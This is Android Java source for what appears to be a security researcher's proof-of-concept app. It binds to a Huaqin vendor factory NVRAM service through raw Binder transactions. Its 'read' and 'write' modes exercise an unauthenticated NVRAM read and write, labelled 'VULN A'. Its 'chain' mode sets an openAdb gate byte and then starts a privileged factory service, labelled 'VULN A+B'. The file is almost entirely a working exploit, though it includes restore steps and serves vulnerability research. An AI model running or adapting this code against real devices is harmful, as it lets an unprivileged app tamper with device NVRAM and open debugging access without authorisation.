package com.probe.nvaidl;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;

public class MainActivity extends Activity {
    static final String TAG = "nvprobe";
    static final String NVSVC_PKG = "com.huaqin.NvService";
    static final String NVSVC_CLS = "com.huaqin.NvService.FactoryNvramService";
    static final String DESC = "aidl.NvAidlService";
    static final String FSV_PKG = "com.huaqin.factoryservice";
    static final String FSV_CLS = "com.huaqin.factoryservice.FactorySetService";
    static final int GATE = 0x18b;

    static IBinder svc;

    static void log(String s) {
        Log.i(TAG, s);
        System.out.println("[NVP] " + s);
    }

    static String readHex(int a, int b) {
        try {
            Parcel d = Parcel.obtain();
            Parcel r = Parcel.obtain();
            d.writeInterfaceToken(DESC);
            d.writeInt(a);
            d.writeInt(b);
            svc.transact(2, d, r, 0);
            int ex = r.readInt();
            String s = (ex == 0) ? r.readString() : null;
            d.recycle();
            r.recycle();
            return s;
        } catch (Throwable t) {
            return null;
        }
    }

    static void write(int idx, int val) {
        try {
            Parcel d = Parcel.obtain();
            Parcel r = Parcel.obtain();
            d.writeInterfaceToken(DESC);
            d.writeInt(idx);
            d.writeInt(val);
            svc.transact(3, d, r, 0);
            int ex = r.readInt();
            int ret = (ex == 0) ? r.readInt() : -999;
            d.recycle();
            r.recycle();
            log("W idx=" + idx + " val=" + val + " ex=" + ex + " ret=" + ret);
        } catch (Throwable t) {
            log("W EX: " + t);
        }
    }

    static int byteAt(int i) {
        String h = readHex(i, i + 1);
        if (h == null || h.length() < 2) return -1;
        return Integer.parseInt(h.substring(0, 2), 16);
    }

    static String readAll() {
        StringBuilder sb = new StringBuilder();
        for (int s = 0; s < 1024; s += 128) {
            String r = readHex(s, s + 128);
            sb.append(r == null ? "" : r);
        }
        return sb.toString();
    }

    // mode from intent extra: read | write | chain  (default: read)
    void run(String mode) {
        log("=== mode=" + mode + " ===");
        log("caller uid=" + android.os.Process.myUid());

        if ("read".equals(mode)) {
            // VULN A: unauthenticated NVRAM read
            String s = readHex(0, 64);
            log("A-READ hex=" + s);
            String full = readAll();
            log("A-READ full-len=" + full.length());
            return;
        }

        if ("write".equals(mode)) {
            // VULN A: prove write persists, then restore exactly (non-destructive)
            String before = readAll();
            int v0 = byteAt(55);
            log("A-WRITE target idx=55 orig=0x" + Integer.toHexString(v0));
            write(55, (v0 == 0x31) ? 2 : 1);
            int v1 = byteAt(55);
            log("A-WRITE verify1=0x" + Integer.toHexString(v1) + " changed=" + (v1 != v0));
            write(55, (v0 == 0x31) ? 1 : (v0 == 0x32 ? 2 : 0));
            int v2 = byteAt(55);
            log("A-WRITE verify2=0x" + Integer.toHexString(v2) + " restored=" + (v2 == v0));
            log("A-WRITE identical=" + before.equals(readAll()));
            return;
        }

        if ("chain".equals(mode)) {
            // VULN A+B: set openAdb gate via NVRAM write, then start system service
            int v0 = byteAt(GATE);
            log("B-GATE before=0x" + Integer.toHexString(v0));
            write(GATE, 1);
            log("B-GATE opened=0x" + Integer.toHexString(byteAt(GATE)));
            Intent s = new Intent();
            s.setComponent(new ComponentName(FSV_PKG, FSV_CLS));
            s.setAction("com.huaqin.action.factoryset");
            log("B-START startService=" + startService(s));
            try { Thread.sleep(3000); } catch (Throwable t) {}
            int v2 = byteAt(GATE);
            log("B-GATE after=0x" + Integer.toHexString(v2));
            if (v2 == 0x31) { write(GATE, 2); log("B-GATE safety-restore"); }
            return;
        }

        log("unknown mode");
    }

    @Override
    protected void onCreate(Bundle bnd) {
        super.onCreate(bnd);
        final String mode = getIntent() != null && getIntent().hasExtra("mode")
                ? getIntent().getStringExtra("mode") : "read";
        try {
            Intent it = new Intent();
            it.setComponent(new ComponentName(NVSVC_PKG, NVSVC_CLS));
            it.setAction("com.huaqin.action.factoryNv");
            ServiceConnection conn = new ServiceConnection() {
                public void onServiceConnected(ComponentName n, IBinder bb) {
                    svc = bb;
                    new Thread() {
                        public void run() {
                            try {
                                log("desc=" + svc.getInterfaceDescriptor());
                                MainActivity.this.run(mode);
                            } catch (Throwable t) {
                                log("EX: " + t);
                            }
                        }
                    }.start();
                }
                public void onServiceDisconnected(ComponentName n) { log("disc"); }
            };
            log("bind=" + bindService(it, conn, Context.BIND_AUTO_CREATE));
        } catch (Throwable t) {
            log("EX: " + t);
        }
    }
}